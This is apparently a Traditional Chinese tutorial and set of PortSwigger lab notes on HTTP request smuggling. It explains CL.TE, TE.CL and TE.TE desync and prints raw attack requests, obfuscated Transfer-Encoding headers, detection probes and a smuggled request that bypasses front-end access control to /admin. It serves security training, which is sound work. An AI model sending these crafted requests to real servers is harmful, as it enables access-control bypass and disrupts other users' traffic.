# HTTP 請求走私（HTTP Request Smuggling）

By: 1PingSun

Ref: [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

---

在本節中，我們將解釋 HTTP 請求走私攻擊，並描述常見的請求走私漏洞是如何產生的。

![alt](src/image.png)

圖片來源：[https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

## 什麼是 HTTP 請求走私？

HTTP 請求走私是一種干擾網站處理來自一個或多個用戶的 HTTP 請求序列的技術。請求走私漏洞通常具有嚴重性質，允許攻擊者繞過安全控制、獲得對敏感資料的未授權存取，並直接危害其他應用程式用戶。

請求走私主要與 HTTP/1 請求相關。然而，支援 HTTP/2 的網站可能也存在漏洞，這取決於其後端架構。

::: info PortSwigger 研究

HTTP 請求走私首次記錄於 2005 年，並因 PortSwigger 在該主題上的廣泛研究而重新受到關注。詳細資訊請查閱以下白皮書：

* [HTTP desync attacks: Request smuggling reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [HTTP/2: The sequel is always worse](https://portswigger.net/research/http2)
* [Browser-powered desync attacks: A new frontier in HTTP request smuggling](https://portswigger.net/research/browser-powered-desync-attacks)
:::

## HTTP 請求走私攻擊中會發生什麼？

如今的 Web 應用程式經常在用戶與最終應用程式邏輯之間採用 HTTP 伺服器鏈。用戶向前端伺服器（有時稱為負載平衡器或反向代理）發送請求，該伺服器將請求轉發給一個或多個後端伺服器。這種架構類型在現代雲端應用程式中越來越常見，在某些情況下是不可避免的。

當前端伺服器將 HTTP 請求轉發到後端伺服器時，它通常會透過同一個後端網路連線發送多個請求，因為這樣更高效且效能更好。該協議非常簡單；HTTP 請求一個接一個地發送，接收伺服器必須確定一個請求在哪裡結束，下一個請求從哪裡開始：

![alt](src/image2.png)

圖片來源：[https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

在這種情況下，前端和後端系統對請求之間的邊界達成一致是至關重要的。否則，攻擊者可能能夠發送一個模糊的請求，該請求被前端和後端系統以不同方式解釋：

![alt](src/image3.png)

圖片來源：[https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

在這裡，攻擊者使其前端請求的一部分被後端伺服器解釋為下一個請求的開始。它實際上被加到下一個請求的前面，因此可以干擾應用程式處理該請求的方式。這就是請求走私攻擊，它可能造成毀滅性的後果。

## HTTP 請求走私漏洞是如何產生的？

大多數 HTTP 請求走私漏洞的產生是因為 HTTP/1 規範提供了兩種不同的方式來指定請求結束的位置：`Content-Length` 標頭和 `Transfer-Encoding` 標頭。

`Content-Length` 標頭很直接：它指定訊息主體的位元組長度。例如：

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

`Transfer-Encoding` 標頭可用於指定訊息主體使用分塊編碼。這意味著訊息主體包含一個或多個資料塊。每個資料塊由資料塊大小（以十六進位表示）組成，後面跟著換行符，然後是資料塊內容。訊息以大小為零的資料塊結束。例如：

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

::: info Note

許多安全測試人員不知道分塊編碼可以在 HTTP 請求中使用，原因有二：

* Burp Suite 會自動解開分塊編碼，使訊息更容易查看和編輯。
* 瀏覽器通常不會在請求中使用分塊編碼，它通常只在伺服器回應中看到。
:::

由於 HTTP/1 規範提供了兩種不同的方法來指定 HTTP 訊息的長度，因此單個訊息可能同時使用這兩種方法，使它們相互衝突。規範試圖透過說明如果 `Content-Length` 和 `Transfer-Encoding` 標頭都存在，那麼應該忽略 `Content-Length` 標頭來防止這個問題。當只有一個伺服器在運作時，這可能足以避免歧義，但當兩個或更多伺服器連接在一起時就不行了。在這種情況下，問題可能因為兩個原因而產生：

* 某些伺服器不支援請求中的 `Transfer-Encoding` 標頭。
* 某些支援 `Transfer-Encoding` 標頭的伺服器，如果標頭以某種方式被混淆，可能會被誘導不處理它。

如果前端和後端伺服器在處理（可能被混淆的）`Transfer-Encoding` 標頭時表現不同，那麼它們可能對連續請求之間的邊界產生分歧，導致請求走私漏洞。

::: info Note

使用端到端 HTTP/2 的網站本質上不受請求走私攻擊影響。由於 HTTP/2 規範引入了單一、穩健的機制來指定請求長度，攻擊者無法引入所需的歧義。

然而，許多網站有一個支援 HTTP/2 的前端伺服器，但將其部署在僅支援 HTTP/1 的後端基礎設施前面。這意味著前端實際上必須將它接收到的請求翻譯成 HTTP/1。這個過程稱為 HTTP 降級。更多資訊請參見[進階請求走私](https://portswigger.net/web-security/request-smuggling/advanced)。
:::

## 如何執行 HTTP 請求走私攻擊

經典的請求走私攻擊涉及將 `Content-Length` 標頭和 `Transfer-Encoding` 標頭都放入單個 HTTP/1 請求中，並操縱這些標頭使前端和後端伺服器以不同方式處理請求。具體的執行方式取決於兩個伺服器的行為：

* **CL.TE**：前端伺服器使用 `Content-Length` 標頭，後端伺服器使用 `Transfer-Encoding` 標頭。
* **TE.CL**：前端伺服器使用 `Transfer-Encoding` 標頭，後端伺服器使用 `Content-Length` 標頭。
* **TE.TE**：前端和後端伺服器都支援 `Transfer-Encoding` 標頭，但其中一個伺服器可以透過某種方式混淆標頭而被誘導不處理它。

::: info Note

這些技術只能使用 HTTP/1 請求執行。瀏覽器和其他客戶端（包括 Burp）預設使用 HTTP/2 與在 TLS 握手期間明確宣告支援它的伺服器通訊。

因此，當測試支援 HTTP/2 的網站時，您需要在 Burp Repeater 中手動切換協議。您可以從 **Inspector** 面板的 **Request attributes** 區段執行此操作。
:::

### CL.TE 漏洞

在這裡，前端伺服器使用 `Content-Length` 標頭，後端伺服器使用 `Transfer-Encoding` 標頭。我們可以執行簡單的 HTTP 請求走私攻擊如下：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端伺服器處理 `Content-Length` 標頭，並確定請求主體長度為 13 位元組，直到 `SMUGGLED` 的結尾。此請求被轉發到後端伺服器。

後端伺服器處理 `Transfer-Encoding` 標頭，因此將訊息主體視為使用分塊編碼。它處理第一個資料塊，該資料塊被聲明為零長度，因此被視為終止請求。接下來的位元組 `SMUGGLED` 未被處理，後端伺服器會將這些位元組視為序列中下一個請求的開始。

::: tip Lab: [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

1. 此 Lab 情境為使用前端和後端兩台伺服器處理請求，前端伺服器不會解析 `Transfer-Encoding`，後端則會。前端伺服器不接受 `GET` 和 `POST` 以外的請求，要想辦法成功向後端發送 `GPOST` 請求以完成此 Lab。
2. 在 Burp Repeater 頁面的 Request attributes 部分設定使用 HTTP/1 進行請求
3. 使用以下請求發送兩次，就可以對後端伺服器進行 `GPOST` 請求，完成此 Lab。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    ```
:::

### TE.CL 漏洞

在這裡，前端伺服器使用 `Transfer-Encoding` 標頭，後端伺服器使用 `Content-Length` 標頭。我們可以執行簡單的 HTTP 請求走私攻擊如下：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

::: info Note

要使用 Burp Repeater 發送此請求，您首先需要進入 Repeater 選單並確保 "Update Content-Length" 選項未勾選。

您需要在最後的 `0` 後面包含尾隨序列 `\r\n\r\n`。
:::

前端伺服器處理 `Transfer-Encoding` 標頭，因此將訊息主體視為使用分塊編碼。它處理第一個資料塊，該資料塊被聲明為 8 位元組長，直到 `SMUGGLED` 後面行的開始。它處理第二個資料塊，該資料塊被聲明為零長度，因此被視為終止請求。此請求被轉發到後端伺服器。

後端伺服器處理 `Content-Length` 標頭，並確定請求主體長度為 3 位元組，直到 `8` 後面行的開始。接下來的位元組，從 `SMUGGLED` 開始，未被處理，後端伺服器會將這些位元組視為序列中下一個請求的開始。

::: tip Lab: [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

1. 連續發送以下請求兩次，完成此 Lab（注意結尾的 `\r\n` 數量）。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked

    5b
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 3

    x=1
    0

    ```
:::

### TE.TE 行為：混淆 TE 標頭

在這裡，前端和後端伺服器都支援 `Transfer-Encoding` 標頭，但其中一個伺服器可以透過某種方式混淆標頭而被誘導不處理它。

混淆 `Transfer-Encoding` 標頭有無數種潛在方式。例如：

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked

Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

這些技術中的每一種都涉及對 HTTP 規範的微妙偏離。實作協議規範的真實世界程式碼很少絕對精確地遵守它，不同的實作容忍規範的不同變化是很常見的。要發現 TE.TE 漏洞，需要找到 `Transfer-Encoding` 標頭的某種變化，使得只有前端或後端伺服器之一處理它，而另一個伺服器忽略它。

根據是前端還是後端伺服器可以被誘導不處理混淆的 `Transfer-Encoding` 標頭，攻擊的其餘部分將採取與已描述的 CL.TE 或 TE.CL 漏洞相同的形式。

::: tip Lab: [HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

1. 發送以下請求，收到回應 `Invalid request`，推測前端為 `TE`。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding: chunked

    3
    0aa
    x

    ```
2. 發送以下請求，正常回傳，因此推測後端亦為 `TE`
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 3
    Transfer-Encoding: chunked

    0

    x
    
    ```
3. 發送以下請求，嘗試使後端改為 `CL`。因 `Content-Length` 長度大於 body 導致超時，證明後端成功被改為 `CL`。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 60
    Transfer-Encoding: chunked
    Transfer-Encoding: foobar

    0

    x

    ```
4. 製作攻擊封包，發送兩次，成功完成此 Lab。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 3
    Transfer-Encoding: chunked
    Transfer-Encoding: foobar

    5b
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 3

    x=0
    0

    ```
:::

## 如何識別 HTTP 請求走私漏洞

在本節中，我們將解釋發現 HTTP 請求走私漏洞的不同技術。

### 使用計時技術尋找 HTTP 請求走私漏洞

檢測 HTTP 請求走私漏洞最普遍有效的方法是發送請求，如果存在漏洞，這些請求會在應用程式的回應中造成時間延遲。Burp Scanner 使用此技術來自動檢測請求走私漏洞。

#### 使用計時技術尋找 CL.TE 漏洞

如果應用程式容易受到 CL.TE 變種的請求走私攻擊，那麼發送如下請求通常會造成時間延遲：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

由於前端伺服器使用 `Content-Length` 標頭，它只會轉發此請求的一部分，省略 `X`。後端伺服器使用 `Transfer-Encoding` 標頭，處理第一個資料塊，然後等待下一個資料塊到達。這將造成可觀察的時間延遲。

#### 使用計時技術尋找 TE.CL 漏洞

如果應用程式容易受到 TE.CL 變種的請求走私攻擊，那麼發送如下請求通常會造成時間延遲：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

由於前端伺服器使用 `Transfer-Encoding` 標頭，它只會轉發此請求的一部分，省略 `X`。後端伺服器使用 `Content-Length` 標頭，期望訊息主體中有更多內容，並等待剩餘內容到達。這將造成可觀察的時間延遲。

::: info Note

如果應用程式容易受到 CL.TE 變種漏洞的攻擊，基於計時的 TE.CL 漏洞測試可能會干擾其他應用程式用戶。因此，為了保持隱蔽性並最小化干擾，您應該首先使用 CL.TE 測試，只有在第一次測試不成功時才繼續進行 TE.CL 測試。
:::

### 使用差異回應確認 HTTP 請求走私漏洞

當檢測到可能的請求走私漏洞時，您可以透過利用該漏洞觸發應用程式回應內容的差異來獲得進一步的漏洞證據。這涉及快速連續向應用程式發送兩個請求：

* 一個「攻擊」請求，旨在干擾下一個請求的處理。
* 一個「正常」請求。

如果對正常請求的回應包含預期的干擾，則漏洞得到確認。

例如，假設正常請求如下所示：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

此請求通常會收到狀態碼為 200 的 HTTP 回應，包含一些搜尋結果。

干擾此請求所需的攻擊請求取決於存在的請求走私變種：CL.TE 與 TE.CL。

#### 使用差異回應確認 CL.TE 漏洞

要確認 CL.TE 漏洞，您需要發送如下攻擊請求：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

如果攻擊成功，則此請求的最後兩行會被後端伺服器視為屬於下一個接收到的請求。這會導致後續的「正常」請求看起來像這樣：

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

由於此請求現在包含無效的 URL，伺服器將回應狀態碼 404，表明攻擊請求確實干擾了它。

::: tip Lab: [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

1. 發送兩次以下請求，完成此 Lab。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30
    Transfer-Encoding: chunked

    0

    GET /404 HTTP/1.1
    Foo: x
    ```
:::

#### 使用差異回應確認 TE.CL 漏洞

要確認 TE.CL 漏洞，您需要發送如下攻擊請求：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

::: info Note

要使用 Burp Repeater 發送此請求，您首先需要進入 Repeater 選單並確保 "Update Content-Length" 選項未勾選。

您需要在最後的 `0` 後面包含尾隨序列 `\r\n\r\n`。
:::

如果攻擊成功，則從 `GET /404` 開始的所有內容都會被後端伺服器視為屬於下一個接收到的請求。這會導致後續的「正常」請求看起來像這樣：

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 146

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

由於此請求現在包含無效的 URL，伺服器將回應狀態碼 404，表明攻擊請求確實干擾了它。

::: tip Lab: [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)

1. 發送兩次以下請求，完成此 Lab。
    ```http
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked

    5e
    POST /404 HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
    ```
:::

::: info Note

在嘗試透過干擾其他請求來確認請求走私漏洞時，應該牢記一些重要的考慮事項：

* 「攻擊」請求和「正常」請求應該使用不同的網路連線發送到伺服器。透過同一個連線發送兩個請求並不能證明漏洞存在。
* 「攻擊」請求和「正常」請求應該盡可能使用相同的 URL 和參數名稱。這是因為許多現代應用程式根據 URL 和參數將前端請求路由到不同的後端伺服器。使用相同的 URL 和參數會增加請求被同一個後端伺服器處理的機會，這對攻擊成功至關重要。
* 當測試「正常」請求以檢測來自「攻擊」請求的任何干擾時，您正在與應用程式同時接收的任何其他請求競爭，包括來自其他用戶的請求。您應該在「攻擊」請求之後立即發送「正常」請求。如果應用程式很忙碌，您可能需要進行多次嘗試來確認漏洞。
* 在某些應用程式中，前端伺服器作為負載平衡器運作，並根據某種負載平衡演算法將請求轉發到不同的後端系統。如果您的「攻擊」和「正常」請求被轉發到不同的後端系統，那麼攻擊將失敗。這是您可能需要嘗試多次才能確認漏洞的額外原因。
* 如果您的攻擊成功干擾了後續請求，但這不是您發送用來檢測干擾的「正常」請求，那麼這意味著另一個應用程式用戶受到了您攻擊的影響。如果您繼續執行測試，這可能會對其他用戶產生破壞性影響，您應該謹慎行事。
:::

## 如何利用 HTTP 請求走私漏洞

在本節中，我們將描述根據應用程式的預期功能和其他行為，HTTP 請求走私漏洞可以被利用的各種方式。

### 使用 HTTP 請求走私繞過前端安全控制

在某些應用程式中，前端網頁伺服器用於實施某些安全控制，決定是否允許處理個別請求。允許的請求被轉發到後端伺服器，在那裡它們被認為已經通過了前端控制。

例如，假設一個應用程式使用前端伺服器來實施存取控制限制，只有在用戶被授權存取請求的 URL 時才轉發請求。後端伺服器然後在不進一步檢查的情況下處理每個請求。在這種情況下，HTTP 請求走私漏洞可以用來繞過存取控制，透過走私一個對受限 URL 的請求。

假設當前用戶被允許存取 `/home` 但不能存取 `/admin`。他們可以使用以下請求走私攻擊來繞過此限制：

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

前端伺服器在這裡看到兩個請求，都是對 `/home` 的，因此請求被轉發到後端伺服器。然而，後端伺服器看到一個對 `/home` 的請求和一個對 `/admin` 的請求。它假設（一如既往）請求已經通過了前端控制，因此允許存取受限的 URL。
